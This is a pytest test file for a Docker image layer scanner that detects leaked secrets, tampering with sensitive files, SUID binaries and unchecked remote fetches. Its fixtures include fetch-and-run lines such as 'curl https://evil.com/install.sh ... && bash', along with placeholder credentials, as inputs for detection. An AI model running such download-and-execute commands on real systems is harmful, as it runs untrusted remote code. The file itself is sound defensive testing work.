"""
Tests for docker/layer_scanner.py
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from docker.layer_scanner import (
    LayerFile,
    LayerFinding,
    LayerMetadata,
    LayerScanReport,
    LayerScanner,
    LayerSeverity,
)


# ===========================================================================
# Helpers
# ===========================================================================

def _layer(
    layer_id: str = "sha256:abc123",
    created_by: str = "RUN echo hello",
    size_bytes: int = 1_000_000,
    files: list[LayerFile] | None = None,
    layer_index: int = 0,
) -> LayerMetadata:
    return LayerMetadata(
        layer_id=layer_id,
        created_by=created_by,
        size_bytes=size_bytes,
        files=files or [],
        layer_index=layer_index,
    )


def _scanner(**kwargs) -> LayerScanner:
    return LayerScanner(**kwargs)


def _check_ids(report: LayerScanReport) -> set[str]:
    return {f.check_id for f in report.findings}


# ===========================================================================
# LayerFile
# ===========================================================================

class TestLayerFile:
    def test_suid_detection(self):
        f = LayerFile(path="/usr/bin/sudo", mode=0o4755)
        assert f.is_suid

    def test_sgid_detection(self):
        f = LayerFile(path="/usr/bin/wall", mode=0o2755)
        assert f.is_sgid

    def test_suid_sgid_both(self):
        f = LayerFile(path="/usr/bin/suidsgid", mode=0o6755)
        assert f.is_suid and f.is_sgid

    def test_normal_file_not_suid(self):
        f = LayerFile(path="/usr/bin/ls", mode=0o755)
        assert not f.is_suid
        assert not f.is_sgid


# ===========================================================================
# LayerFinding
# ===========================================================================

class TestLayerFinding:
    def _f(self) -> LayerFinding:
        return LayerFinding(
            check_id="LAY-001",
            severity=LayerSeverity.CRITICAL,
            title="Secret in history",
            detail="Detail",
            remediation="Fix",
            layer_id="sha256:abc",
            layer_index=2,
            evidence="pattern match",
        )

    def test_summary_contains_check_id(self):
        assert "LAY-001" in self._f().summary()

    def test_summary_contains_layer_index(self):
        assert "2" in self._f().summary()

    def test_to_dict_keys(self):
        d = self._f().to_dict()
        for k in ("check_id", "severity", "title", "detail", "remediation",
                  "layer_id", "layer_index", "evidence"):
            assert k in d

    def test_severity_serialized_as_string(self):
        assert self._f().to_dict()["severity"] == "CRITICAL"


# ===========================================================================
# LayerScanReport
# ===========================================================================

class TestLayerScanReport:
    def _report(self) -> LayerScanReport:
        f1 = LayerFinding("LAY-001", LayerSeverity.CRITICAL, "t", "d", "r", layer_index=0)
        f2 = LayerFinding("LAY-003", LayerSeverity.HIGH,     "t", "d", "r", layer_index=1)
        return LayerScanReport(
            findings=[f1, f2],
            total_layers=5,
            total_size_bytes=100 * 1024 * 1024,
            risk_score=65,
            image_tag="myapp:latest",
        )

    def test_total_findings(self):
        assert self._report().total_findings == 2

    def test_critical_findings(self):
        assert len(self._report().critical_findings) == 1

    def test_high_findings(self):
        assert len(self._report().high_findings) == 1

    def test_findings_by_check(self):
        assert len(self._report().findings_by_check("LAY-001")) == 1

    def test_findings_by_layer(self):
        assert len(self._report().findings_by_layer(0)) == 1
        assert len(self._report().findings_by_layer(1)) == 1

    def test_summary_contains_tag(self):
        assert "myapp:latest" in self._report().summary()

    def test_summary_contains_risk_score(self):
        assert "65" in self._report().summary()

    def test_empty_report(self):
        r = LayerScanReport()
        assert r.total_findings == 0


# ===========================================================================
# LAY-001: Secret in history
# ===========================================================================

class TestLAY001:
    def test_fires_for_password_in_env(self):
        scanner = _scanner()
        lyr = _layer(created_by="ENV DB_PASSWORD=supersecret123")
        report = scanner.scan([lyr])
        assert "LAY-001" in _check_ids(report)

    def test_fires_for_aws_access_key(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE")
        report = scanner.scan([lyr])
        assert "LAY-001" in _check_ids(report)

    def test_fires_for_github_token(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN git clone https://ghp_abcdefghijklmnopqrstuvwxyz123456789012")
        report = scanner.scan([lyr])
        assert "LAY-001" in _check_ids(report)

    def test_fires_for_private_key_header(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN echo '-----BEGIN RSA PRIVATE KEY-----' > /key.pem")
        report = scanner.scan([lyr])
        assert "LAY-001" in _check_ids(report)

    def test_not_fired_for_safe_command(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apt-get update && apt-get install -y curl")
        report = scanner.scan([lyr])
        assert "LAY-001" not in _check_ids(report)

    def test_lay001_is_critical(self):
        scanner = _scanner()
        lyr = _layer(created_by="ENV API_KEY=abc123secret")
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-001")
        assert f.severity == LayerSeverity.CRITICAL


# ===========================================================================
# LAY-002: Package cache not cleaned
# ===========================================================================

class TestLAY002:
    def test_fires_for_apt_without_clean(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apt-get install -y curl")
        report = scanner.scan([lyr])
        assert "LAY-002" in _check_ids(report)

    def test_fires_for_apk_without_no_cache(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apk add curl")
        report = scanner.scan([lyr])
        assert "LAY-002" in _check_ids(report)

    def test_not_fired_when_cache_cleaned(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apt-get install -y curl && rm -rf /var/lib/apt/lists/*")
        report = scanner.scan([lyr])
        assert "LAY-002" not in _check_ids(report)

    def test_not_fired_for_apk_no_cache(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apk add --no-cache curl")
        report = scanner.scan([lyr])
        assert "LAY-002" not in _check_ids(report)

    def test_not_fired_for_non_install(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN echo hello")
        report = scanner.scan([lyr])
        assert "LAY-002" not in _check_ids(report)

    def test_lay002_is_low(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN apt-get install -y wget")
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-002")
        assert f.severity == LayerSeverity.LOW


# ===========================================================================
# LAY-003: Sensitive file modified
# ===========================================================================

class TestLAY003:
    def test_fires_for_shadow_modification(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/etc/shadow", mode=0o640)])
        report = scanner.scan([lyr])
        assert "LAY-003" in _check_ids(report)

    def test_fires_for_sshd_config(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/etc/ssh/sshd_config", mode=0o644)])
        report = scanner.scan([lyr])
        assert "LAY-003" in _check_ids(report)

    def test_fires_for_sudoers(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/etc/sudoers.d/myuser", mode=0o440)])
        report = scanner.scan([lyr])
        assert "LAY-003" in _check_ids(report)

    def test_fires_for_authorized_keys(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/root/.ssh/authorized_keys", mode=0o600)])
        report = scanner.scan([lyr])
        assert "LAY-003" in _check_ids(report)

    def test_not_fired_for_safe_file(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/usr/bin/myapp", mode=0o755)])
        report = scanner.scan([lyr])
        assert "LAY-003" not in _check_ids(report)

    def test_lay003_is_high(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/etc/passwd", mode=0o644)])
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-003")
        assert f.severity == LayerSeverity.HIGH


# ===========================================================================
# LAY-004: SUID/SGID binary
# ===========================================================================

class TestLAY004:
    def test_fires_for_suid_binary(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/usr/bin/evil", mode=0o4755)])
        report = scanner.scan([lyr])
        assert "LAY-004" in _check_ids(report)

    def test_fires_for_sgid_binary(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/usr/bin/evil", mode=0o2755)])
        report = scanner.scan([lyr])
        assert "LAY-004" in _check_ids(report)

    def test_not_fired_for_normal_binary(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/usr/bin/ls", mode=0o755)])
        report = scanner.scan([lyr])
        assert "LAY-004" not in _check_ids(report)

    def test_lay004_is_high(self):
        scanner = _scanner()
        lyr = _layer(files=[LayerFile("/usr/local/bin/custom", mode=0o4755)])
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-004")
        assert f.severity == LayerSeverity.HIGH


# ===========================================================================
# LAY-005: Excessive layer count
# ===========================================================================

class TestLAY005:
    def test_fires_when_too_many_layers(self):
        scanner = LayerScanner(max_layers=3)
        layers = [_layer(layer_index=i) for i in range(4)]
        report = scanner.scan(layers)
        assert "LAY-005" in _check_ids(report)

    def test_not_fired_at_limit(self):
        scanner = LayerScanner(max_layers=5)
        layers = [_layer(layer_index=i) for i in range(5)]
        report = scanner.scan(layers)
        assert "LAY-005" not in _check_ids(report)

    def test_lay005_is_medium(self):
        scanner = LayerScanner(max_layers=1)
        layers = [_layer(), _layer()]
        report = scanner.scan(layers)
        f = next(f for f in report.findings if f.check_id == "LAY-005")
        assert f.severity == LayerSeverity.MEDIUM


# ===========================================================================
# LAY-006: Oversized layer
# ===========================================================================

class TestLAY006:
    def test_fires_for_oversized_layer(self):
        scanner = LayerScanner(max_layer_bytes=10_000_000)  # 10 MB
        lyr = _layer(size_bytes=20_000_000)
        report = scanner.scan([lyr])
        assert "LAY-006" in _check_ids(report)

    def test_not_fired_within_limit(self):
        scanner = LayerScanner(max_layer_bytes=500_000_000)
        lyr = _layer(size_bytes=1_000_000)
        report = scanner.scan([lyr])
        assert "LAY-006" not in _check_ids(report)

    def test_lay006_is_medium(self):
        scanner = LayerScanner(max_layer_bytes=1_000)
        lyr = _layer(size_bytes=2_000)
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-006")
        assert f.severity == LayerSeverity.MEDIUM


# ===========================================================================
# LAY-007: Remote fetch without checksum
# ===========================================================================

class TestLAY007:
    def test_fires_for_curl_without_checksum(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN curl -o /tmp/setup.sh https://example.com/setup.sh && bash /tmp/setup.sh")
        report = scanner.scan([lyr])
        assert "LAY-007" in _check_ids(report)

    def test_fires_for_wget_without_checksum(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN wget https://example.com/tool.tar.gz -O /tmp/tool.tar.gz")
        report = scanner.scan([lyr])
        assert "LAY-007" in _check_ids(report)

    def test_not_fired_with_sha256sum(self):
        scanner = _scanner()
        lyr = _layer(created_by=(
            "RUN curl -o /tmp/f.tar.gz https://example.com/f.tar.gz && "
            "echo 'abc123 /tmp/f.tar.gz' | sha256sum -c"
        ))
        report = scanner.scan([lyr])
        assert "LAY-007" not in _check_ids(report)

    def test_not_fired_without_fetch(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN echo hello && sha256sum /etc/passwd")
        report = scanner.scan([lyr])
        assert "LAY-007" not in _check_ids(report)

    def test_lay007_is_high(self):
        scanner = _scanner()
        lyr = _layer(created_by="RUN curl https://evil.com/install.sh > /tmp/i.sh && bash /tmp/i.sh")
        report = scanner.scan([lyr])
        f = next(f for f in report.findings if f.check_id == "LAY-007")
        assert f.severity == LayerSeverity.HIGH


# ===========================================================================
# Risk score
# ===========================================================================

class TestRiskScore:
    def test_clean_layer_zero_risk(self):
        scanner = _scanner()
        lyr = _layer(
            created_by="RUN apt-get update && apt-get install -y git=2.40.0 && rm -rf /var/lib/apt/lists/*",
            size_bytes=10_000_000,
            files=[LayerFile("/usr/bin/git", mode=0o755)],
        )
        report = scanner.scan([lyr])
        assert report.risk_score == 0

    def test_risk_capped_at_100(self):
        scanner = LayerScanner(max_layers=1, max_layer_bytes=1)
        lyr = _layer(
            created_by="RUN curl https://x.com/install.sh | bash && ENV SECRET=abc",
            size_bytes=999_999_999,
            files=[
                LayerFile("/etc/shadow", mode=0o640),
                LayerFile("/usr/bin/evil", mode=0o4755),
            ],
        )
        report = scanner.scan([lyr, lyr])
        assert report.risk_score <= 100

    def test_lay001_alone_40(self):
        scanner = _scanner()
        lyr = _layer(created_by="ENV PASSWORD=mysecret")
        report = scanner.scan([lyr])
        assert report.risk_score == 40


# ===========================================================================
# image_tag in report
# ===========================================================================

class TestImageTag:
    def test_image_tag_in_summary(self):
        scanner = _scanner()
        report = scanner.scan([], image_tag="myapp:v1.2.3")
        assert "myapp:v1.2.3" in report.summary()


# ===========================================================================
# total_size_bytes
# ===========================================================================

class TestTotalSize:
    def test_total_size_aggregated(self):
        scanner = _scanner()
        layers = [
            _layer(size_bytes=100_000),
            _layer(size_bytes=200_000),
        ]
        report = scanner.scan(layers)
        assert report.total_size_bytes == 300_000
